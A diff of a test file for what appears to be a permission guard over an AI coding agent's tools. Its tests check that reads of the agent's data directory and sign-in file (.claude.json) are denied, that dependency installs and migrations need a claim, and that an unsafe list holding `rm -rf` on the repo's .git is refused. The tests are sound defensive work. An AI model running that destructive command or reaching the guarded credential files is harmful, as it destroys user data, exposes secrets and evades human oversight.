+        input: () => ({ pattern: 'png', path: OWN_FILES }),
+      },
+    ];
+    for (const { name, tool, input } of rows) {
+      for (const readOnly of [false, true]) {
+        const label = `${name}${readOnly ? ' (read-only step)' : ''}`;
+        const verdict = judge(tool, input(), [{ kind: 'area', name: 'api' }], readOnly);
+        expect.soft(verdict.decision, label).toBe('deny');
+        expect
+          .soft(verdict.decision === 'deny' ? verdict.reason : '', label)
+          .toMatch(/data directory|sign-in/);
+      }
     }
   });
 
-  it.each<{ name: string; tool: string; input: () => Record<string, unknown> }>([
-    {
-      name: "Read of the session's own saved output",
-      tool: 'Read',
-      input: () => ({ file_path: join(OWN_RESULTS, 'out.txt') }),
-    },
-    {
-      name: "Grep in the session's own saved output",
-      tool: 'Grep',
-      input: () => ({ pattern: 'big', path: OWN_RESULTS }),
-    },
-    {
-      name: "Read of a picture pasted into the session's own task",
-      tool: 'Read',
-      input: () => ({ file_path: join(OWN_FILES, 'shot.png') }),
-    },
-    {
-      name: 'Grep with a regex that looks like a path',
-      tool: 'Grep',
-      input: () => ({ pattern: '~/.claude', path: 'src' }),
-    },
-  ])('allows $name', ({ tool, input }) => {
-    for (const readOnly of [false, true])
-      expect(judge(tool, input(), [{ kind: 'area', name: 'api' }], readOnly)).toEqual({
-        decision: 'allow',
-      });
+  it("allows the session's own output and pictures, and a regex that only looks like a path", () => {
+    const rows: { name: string; tool: string; input: () => Record<string, unknown> }[] = [
+      {
+        name: "Read of the session's own saved output",
+        tool: 'Read',
+        input: () => ({ file_path: join(OWN_RESULTS, 'out.txt') }),
+      },
+      {
+        name: "Grep in the session's own saved output",
+        tool: 'Grep',
+        input: () => ({ pattern: 'big', path: OWN_RESULTS }),
+      },
+      {
+        name: "Read of a picture pasted into the session's own task",
+        tool: 'Read',
+        input: () => ({ file_path: join(OWN_FILES, 'shot.png') }),
+      },
+      {
+        name: 'Grep with a regex that looks like a path',
+        tool: 'Grep',
+        input: () => ({ pattern: '~/.claude', path: 'src' }),
+      },
+    ];
+    for (const { name, tool, input } of rows) {
+      for (const readOnly of [false, true]) {
+        expect
+          .soft(judge(tool, input(), [{ kind: 'area', name: 'api' }], readOnly), name)
+          .toEqual({ decision: 'allow' });
+      }
+    }
   });
 
   it('still lets a tool read inside the repo', () => {
@@ -2630,175 +2750,179 @@ describe('account isolation with a nested data directory', () => {
     });
   const N = () => nested.path;
 
-  it('denies the Glob tool with a ** pattern under Library', () => {
+  it('denies a ** Glob under Library and allows one clear of the data directory', () => {
     expect(run('Glob', { pattern: `${N()}/Library/**/.claude.json` }).decision).toBe('deny');
-  });
-
-  it('allows a Glob that stays clear of the data directory', () => {
     expect(run('Glob', { pattern: `${N()}/Projects/*` })).toEqual({ decision: 'allow' });
   });
 });
 
 describe('hazardFor agrees with the guard on which commands need a hazard claim', () => {
-  it.each([
-    { command: 'pnpm add x', hazard: 'deps' },
-    { command: "sh -c 'pnpm add x'", hazard: 'deps' },
-    { command: 'eval "pnpm add x"', hazard: 'deps' },
-    { command: 'find . -exec pnpm add x \\;', hazard: 'deps' },
-    { command: 'npx pnpm add x', hazard: 'deps' },
-    { command: 'env X=1 pnpm add x', hazard: 'deps' },
-    { command: 'echo "$(pnpm add x)"', hazard: 'deps' },
-    { command: 'npm add x', hazard: 'deps' },
-    { command: 'npm ci', hazard: 'deps' },
-    { command: 'npm ci --omit=dev', hazard: 'deps' },
-    { command: 'npm un x', hazard: 'deps' },
-    { command: 'pnpm uninstall x', hazard: 'deps' },
-    { command: 'pnpm --filter a un x', hazard: 'deps' },
-    { command: 'pnpm upgrade', hazard: 'deps' },
-    { command: 'yarn add x', hazard: 'deps' },
-    { command: 'cargo update', hazard: 'deps' },
-    { command: 'pnpm db:migrate', hazard: 'migrations' },
-    // Python, Go and Ruby dependency tools, bare and behind runners.
-    { command: 'uv lock', hazard: 'deps' },
-    { command: 'uv add requests', hazard: 'deps' },
-    { command: 'uv remove requests', hazard: 'deps' },
-    { command: 'uv sync', hazard: 'deps' },
-    { command: 'uv pip install requests', hazard: 'deps' },
-    { command: 'poetry add requests', hazard: 'deps' },
-    { command: 'poetry lock', hazard: 'deps' },
-    { command: 'pip install requests', hazard: 'deps' },
-    { command: 'pip install -r requirements.txt', hazard: 'deps' },
-    { command: 'pip3 uninstall requests', hazard: 'deps' },
-    { command: 'pipenv install requests', hazard: 'deps' },
-    { command: 'go get example.com/x', hazard: 'deps' },
-    { command: 'go mod tidy', hazard: 'deps' },
-    { command: 'bundle add rails', hazard: 'deps' },
-    { command: 'bundle install', hazard: 'deps' },
-    { command: 'bundle update', hazard: 'deps' },
-    { command: 'bundle exec bundle add rails', hazard: 'deps' },
-    { command: 'uv run uv lock', hazard: 'deps' },
-    { command: 'poetry run pip install x', hazard: 'deps' },
-    { command: 'docker compose exec -T backend uv lock', hazard: 'deps' },
-    { command: 'docker compose -f dev.yml exec backend uv add x', hazard: 'deps' },
-    { command: 'docker compose exec -e FOO=1 -u root backend pip install x', hazard: 'deps' },
-    { command: 'docker-compose exec backend poetry add x', hazard: 'deps' },
-    { command: 'docker compose run --rm backend uv sync', hazard: 'deps' },
-    { command: 'docker exec -it api_1 uv lock', hazard: 'deps' },
-    { command: 'docker exec -w /app api_1 go get x', hazard: 'deps' },
-    { command: 'docker compose exec web bundle add rails', hazard: 'deps' },
-    { command: 'docker compose exec backend uv run uv lock', hazard: 'deps' },
-    { command: "sh -c 'docker compose exec -T backend uv lock'", hazard: 'deps' },
-    // Migrations: creating them, and applying them to the shared database.
-    { command: 'python manage.py makemigrations', hazard: 'migrations' },
-    { command: 'python3 manage.py makemigrations app', hazard: 'migrations' },
-    { command: './manage.py makemigrations', hazard: 'migrations' },
-    { command: 'python manage.py migrate', hazard: 'migrations' },
-    { command: 'django-admin makemigrations', hazard: 'migrations' },
-    { command: 'alembic revision --autogenerate -m x', hazard: 'migrations' },
-    { command: 'alembic upgrade head', hazard: 'migrations' },
-    { command: 'rails generate migration AddX', hazard: 'migrations' },
-    { command: 'rails db:migrate', hazard: 'migrations' },
-    { command: 'bin/rails db:migrate', hazard: 'migrations' },
-    { command: 'bundle exec rails db:migrate', hazard: 'migrations' },
-    { command: 'prisma migrate dev --name x', hazard: 'migrations' },
-    { command: 'npx prisma migrate dev', hazard: 'migrations' },
-    { command: 'pnpm exec prisma migrate dev', hazard: 'migrations' },
-    { command: 'uv run python manage.py migrate', hazard: 'migrations' },
-    { command: 'poetry run alembic upgrade head', hazard: 'migrations' },
-    {
-      command: 'docker compose exec -T backend python manage.py makemigrations',
-      hazard: 'migrations',
-    },
-    { command: 'docker compose exec backend python manage.py migrate', hazard: 'migrations' },
-    { command: 'docker exec api_1 alembic upgrade head', hazard: 'migrations' },
-    {
-      command: 'docker compose exec backend uv run python manage.py migrate',
-      hazard: 'migrations',
-    },
-    // A preview flag counts only where the program reads it as one; a script gets it as an argument.
-    { command: 'pnpm db:migrate --check', hazard: 'migrations' },
-    { command: 'yarn db:migrate --plan', hazard: 'migrations' },
-    { command: 'npm run db:migrate -- --dry-run', hazard: 'migrations' },
-    { command: 'npm install lodash --check', hazard: 'deps' },
-    { command: 'npm install lodash --plan', hazard: 'deps' },
-    { command: 'python manage.py makemigrations --check', hazard: 'migrations' },
-    { command: 'docker compose exec --dry-run backend uv lock', hazard: 'deps' },
-    { command: 'uv add requests --check', hazard: 'deps' },
-    // A shell a runner starts runs its script like any other shell.
-    { command: "docker compose exec -T backend sh -c 'uv lock'", hazard: 'deps' },
-    {
-      command: 'docker compose exec backend bash -c "cd /app && python manage.py migrate"',
-      hazard: 'migrations',
-    },
-    { command: "docker exec api_1 sh -c 'alembic upgrade head'", hazard: 'migrations' },
-    { command: "docker exec -u root api_1 sh -c 'uv lock'", hazard: 'deps' },
-    { command: "docker exec -i api_1 sh <<< 'uv lock'", hazard: 'deps' },
-    { command: "uv run sh -c 'uv lock'", hazard: 'deps' },
-    { command: "docker compose exec -T backend sh -c 'pytest'", hazard: null },
-    // Read-only checks need no claim.
-    { command: 'npm install --dry-run', hazard: null },
-    { command: 'npm i x --dry-run', hazard: null },
-    { command: 'python manage.py migrate --plan', hazard: null },
-    { command: 'python manage.py migrate --check', hazard: null },
-    { command: 'python manage.py makemigrations --check --dry-run', hazard: null },
-    { command: 'uv sync --check', hazard: null },
-    { command: 'poetry add requests --dry-run', hazard: null },
-    { command: 'cargo add serde --dry-run', hazard: null },
-    { command: 'rake db:migrate --dry-run', hazard: null },
-    {
-      command: 'docker compose exec -T backend python manage.py makemigrations --check --dry-run',
-      hazard: null,
-    },
-    { command: 'python manage.py makemigrations --dry-run', hazard: null },
-    { command: 'python manage.py showmigrations', hazard: null },
-    { command: 'docker compose exec backend python manage.py showmigrations', hazard: null },
-    { command: 'alembic current', hazard: null },
-    { command: 'alembic history', hazard: null },
-    { command: 'rails db:migrate:status', hazard: null },
-    { command: 'prisma migrate status', hazard: null },
-    { command: 'go mod verify', hazard: null },
-    { command: 'go mod graph', hazard: null },
-    { command: 'go build ./...', hazard: null },
-    { command: 'uv lock --check', hazard: null },
-    { command: 'uv tree', hazard: null },
-    { command: 'uv run pytest', hazard: null },
-    { command: 'poetry run pytest', hazard: null },
-    { command: 'poetry show', hazard: null },
-    { command: 'pip list', hazard: null },
-    { command: 'pip install --dry-run requests', hazard: null },
-    { command: 'bundle exec rspec', hazard: null },
-    { command: 'bundle check', hazard: null },
-    { command: 'docker compose exec -T backend pytest', hazard: null },
-    { command: 'docker compose exec -T backend uv run pytest', hazard: null },
-    { command: 'docker compose up -d', hazard: null },
-    { command: 'docker exec api_1 ls', hazard: null },
-    { command: 'docker build -t x .', hazard: null },
-    { command: 'cargo update --dry-run', hazard: null },
-    { command: 'pnpm test', hazard: null },
-    { command: "sh -c 'pnpm test'", hazard: null },
-    { command: 'echo pnpm add x', hazard: null },
-  ])('$command', ({ command, hazard }) => {
-    expect(hazardFor(command, DEFAULT_HAZARDS)).toBe(hazard);
-    const verdict = judge('Bash', { command });
-    expect(verdict.decision === 'deny' && verdict.reason.includes('hazard claim')).toBe(
-      hazard !== null,
-    );
+  it('names the hazard each command needs, and the guard refuses exactly those', () => {
+    const rows: { command: string; hazard: string | null }[] = [
+      { command: 'pnpm add x', hazard: 'deps' },
+      { command: "sh -c 'pnpm add x'", hazard: 'deps' },
+      { command: 'eval "pnpm add x"', hazard: 'deps' },
+      { command: 'find . -exec pnpm add x \\;', hazard: 'deps' },
+      { command: 'npx pnpm add x', hazard: 'deps' },
+      { command: 'env X=1 pnpm add x', hazard: 'deps' },
+      { command: 'echo "$(pnpm add x)"', hazard: 'deps' },
+      { command: 'npm add x', hazard: 'deps' },
+      { command: 'npm ci', hazard: 'deps' },
+      { command: 'npm ci --omit=dev', hazard: 'deps' },
+      { command: 'npm un x', hazard: 'deps' },
+      { command: 'pnpm uninstall x', hazard: 'deps' },
+      { command: 'pnpm --filter a un x', hazard: 'deps' },
+      { command: 'pnpm upgrade', hazard: 'deps' },
+      { command: 'yarn add x', hazard: 'deps' },
+      { command: 'cargo update', hazard: 'deps' },
+      { command: 'pnpm db:migrate', hazard: 'migrations' },
+      // Python, Go and Ruby dependency tools, bare and behind runners.
+      { command: 'uv lock', hazard: 'deps' },
+      { command: 'uv add requests', hazard: 'deps' },
+      { command: 'uv remove requests', hazard: 'deps' },
+      { command: 'uv sync', hazard: 'deps' },
+      { command: 'uv pip install requests', hazard: 'deps' },
+      { command: 'poetry add requests', hazard: 'deps' },
+      { command: 'poetry lock', hazard: 'deps' },
+      { command: 'pip install requests', hazard: 'deps' },
+      { command: 'pip install -r requirements.txt', hazard: 'deps' },
+      { command: 'pip3 uninstall requests', hazard: 'deps' },
+      { command: 'pipenv install requests', hazard: 'deps' },
+      { command: 'go get example.com/x', hazard: 'deps' },
+      { command: 'go mod tidy', hazard: 'deps' },
+      { command: 'bundle add rails', hazard: 'deps' },
+      { command: 'bundle install', hazard: 'deps' },
+      { command: 'bundle update', hazard: 'deps' },
+      { command: 'bundle exec bundle add rails', hazard: 'deps' },
+      { command: 'uv run uv lock', hazard: 'deps' },
+      { command: 'poetry run pip install x', hazard: 'deps' },
+      { command: 'docker compose exec -T backend uv lock', hazard: 'deps' },
+      { command: 'docker compose -f dev.yml exec backend uv add x', hazard: 'deps' },
+      { command: 'docker compose exec -e FOO=1 -u root backend pip install x', hazard: 'deps' },
+      { command: 'docker-compose exec backend poetry add x', hazard: 'deps' },
+      { command: 'docker compose run --rm backend uv sync', hazard: 'deps' },
+      { command: 'docker exec -it api_1 uv lock', hazard: 'deps' },
+      { command: 'docker exec -w /app api_1 go get x', hazard: 'deps' },
+      { command: 'docker compose exec web bundle add rails', hazard: 'deps' },
+      { command: 'docker compose exec backend uv run uv lock', hazard: 'deps' },
+      { command: "sh -c 'docker compose exec -T backend uv lock'", hazard: 'deps' },
+      // Migrations: creating them, and applying them to the shared database.
+      { command: 'python manage.py makemigrations', hazard: 'migrations' },
+      { command: 'python3 manage.py makemigrations app', hazard: 'migrations' },
+      { command: './manage.py makemigrations', hazard: 'migrations' },
+      { command: 'python manage.py migrate', hazard: 'migrations' },
+      { command: 'django-admin makemigrations', hazard: 'migrations' },
+      { command: 'alembic revision --autogenerate -m x', hazard: 'migrations' },
+      { command: 'alembic upgrade head', hazard: 'migrations' },
+      { command: 'rails generate migration AddX', hazard: 'migrations' },
+      { command: 'rails db:migrate', hazard: 'migrations' },
+      { command: 'bin/rails db:migrate', hazard: 'migrations' },
+      { command: 'bundle exec rails db:migrate', hazard: 'migrations' },
+      { command: 'prisma migrate dev --name x', hazard: 'migrations' },
+      { command: 'npx prisma migrate dev', hazard: 'migrations' },
+      { command: 'pnpm exec prisma migrate dev', hazard: 'migrations' },
+      { command: 'uv run python manage.py migrate', hazard: 'migrations' },
+      { command: 'poetry run alembic upgrade head', hazard: 'migrations' },
+      {
+        command: 'docker compose exec -T backend python manage.py makemigrations',
+        hazard: 'migrations',
+      },
+      { command: 'docker compose exec backend python manage.py migrate', hazard: 'migrations' },
+      { command: 'docker exec api_1 alembic upgrade head', hazard: 'migrations' },
+      {
+        command: 'docker compose exec backend uv run python manage.py migrate',
+        hazard: 'migrations',
+      },
+      // A preview flag counts only where the program reads it as one; a script gets it as an argument.
+      { command: 'pnpm db:migrate --check', hazard: 'migrations' },
+      { command: 'yarn db:migrate --plan', hazard: 'migrations' },
+      { command: 'npm run db:migrate -- --dry-run', hazard: 'migrations' },
+      { command: 'npm install lodash --check', hazard: 'deps' },
+      { command: 'npm install lodash --plan', hazard: 'deps' },
+      { command: 'python manage.py makemigrations --check', hazard: 'migrations' },
+      { command: 'docker compose exec --dry-run backend uv lock', hazard: 'deps' },
+      { command: 'uv add requests --check', hazard: 'deps' },
+      // A shell a runner starts runs its script like any other shell.
+      { command: "docker compose exec -T backend sh -c 'uv lock'", hazard: 'deps' },
+      {
+        command: 'docker compose exec backend bash -c "cd /app && python manage.py migrate"',
+        hazard: 'migrations',
+      },
+      { command: "docker exec api_1 sh -c 'alembic upgrade head'", hazard: 'migrations' },
+      { command: "docker exec -u root api_1 sh -c 'uv lock'", hazard: 'deps' },
+      { command: "docker exec -i api_1 sh <<< 'uv lock'", hazard: 'deps' },
+      { command: "uv run sh -c 'uv lock'", hazard: 'deps' },
+      { command: "docker compose exec -T backend sh -c 'pytest'", hazard: null },
+      // Read-only checks need no claim.
+      { command: 'npm install --dry-run', hazard: null },
+      { command: 'npm i x --dry-run', hazard: null },
+      { command: 'python manage.py migrate --plan', hazard: null },
+      { command: 'python manage.py migrate --check', hazard: null },
+      { command: 'python manage.py makemigrations --check --dry-run', hazard: null },
+      { command: 'uv sync --check', hazard: null },
+      { command: 'poetry add requests --dry-run', hazard: null },
+      { command: 'cargo add serde --dry-run', hazard: null },
+      { command: 'rake db:migrate --dry-run', hazard: null },
+      {
+        command: 'docker compose exec -T backend python manage.py makemigrations --check --dry-run',
+        hazard: null,
+      },
+      { command: 'python manage.py makemigrations --dry-run', hazard: null },
+      { command: 'python manage.py showmigrations', hazard: null },
+      { command: 'docker compose exec backend python manage.py showmigrations', hazard: null },
+      { command: 'alembic current', hazard: null },
+      { command: 'alembic history', hazard: null },
+      { command: 'rails db:migrate:status', hazard: null },
+      { command: 'prisma migrate status', hazard: null },
+      { command: 'go mod verify', hazard: null },
+      { command: 'go mod graph', hazard: null },
+      { command: 'go build ./...', hazard: null },
+      { command: 'uv lock --check', hazard: null },
+      { command: 'uv tree', hazard: null },
+      { command: 'uv run pytest', hazard: null },
+      { command: 'poetry run pytest', hazard: null },
+      { command: 'poetry show', hazard: null },
+      { command: 'pip list', hazard: null },
+      { command: 'pip install --dry-run requests', hazard: null },
+      { command: 'bundle exec rspec', hazard: null },
+      { command: 'bundle check', hazard: null },
+      { command: 'docker compose exec -T backend pytest', hazard: null },
+      { command: 'docker compose exec -T backend uv run pytest', hazard: null },
+      { command: 'docker compose up -d', hazard: null },
+      { command: 'docker exec api_1 ls', hazard: null },
+      { command: 'docker build -t x .', hazard: null },
+      { command: 'cargo update --dry-run', hazard: null },
+      { command: 'pnpm test', hazard: null },
+      { command: "sh -c 'pnpm test'", hazard: null },
+      { command: 'echo pnpm add x', hazard: null },
+    ];
+    for (const { command, hazard } of rows) {
+      expect.soft(hazardFor(command, DEFAULT_HAZARDS), command).toBe(hazard);
+      const verdict = judge('Bash', { command });
+      expect
+        .soft(verdict.decision === 'deny' && verdict.reason.includes('hazard claim'), command)
+        .toBe(hazard !== null);
+    }
   });
 });
 
 describe('what the refusal of an unclaimed hazard command says to do instead', () => {
-  it.each([
-    { command: 'pnpm add x', install: true },
-    { command: 'pnpm install', install: true },
-    { command: 'uv add requests', install: true },
-    { command: 'pnpm db:migrate', install: false },
-  ])('$command names install_dependencies: $install', ({ command, install }) => {
-    const verdict = judge('Bash', { command });
-    expect(verdict.decision).toBe('deny');
-    if (verdict.decision !== 'deny') return;
-    expect(verdict.reason).toContain('request_claim');
-    expect(verdict.reason.includes('install_dependencies')).toBe(install);
-    expect(verdict.reason.includes('Never run pnpm add or pnpm install yourself')).toBe(install);
+  it('names request_claim, and install_dependencies only for a dependency install', () => {
+    for (const { command, install } of [
+      { command: 'pnpm add x', install: true },
+      { command: 'pnpm install', install: true },
+      { command: 'uv add requests', install: true },
+      { command: 'pnpm db:migrate', install: false },
+    ]) {
+      const verdict = judge('Bash', { command });
+      expect.soft(verdict.decision, command).toBe('deny');
+      if (verdict.decision !== 'deny') continue;
+      expect.soft(verdict.reason, command).toContain('request_claim');
+      expect.soft(verdict.reason.includes('install_dependencies'), command).toBe(install);
+      expect
+        .soft(verdict.reason.includes('Never run pnpm add or pnpm install yourself'), command)
+        .toBe(install);
+    }
   });
 });
 
@@ -2812,10 +2936,12 @@ describe('a Monitor command is judged as a Bash command', () => {
     `rm -rf ${join(repo.path, '.git')}`,
     'pnpm add x',
   ];
-  it.each(UNSAFE)('refuses %s through Monitor as through Bash', (command) => {
-    const viaBash = bash(command);
-    expect(viaBash.decision).toBe('deny');
-    expect(judge('Monitor', { command })).toEqual(viaBash);
+  it('refuses through Monitor what it refuses through Bash, with the same verdict', () => {
+    for (const command of UNSAFE) {
+      const viaBash = bash(command);
+      expect.soft(viaBash.decision, command).toBe('deny');
+      expect.soft(judge('Monitor', { command }), command).toEqual(viaBash);
+    }
   });
 
   it('allows a plain Monitor command', () => {
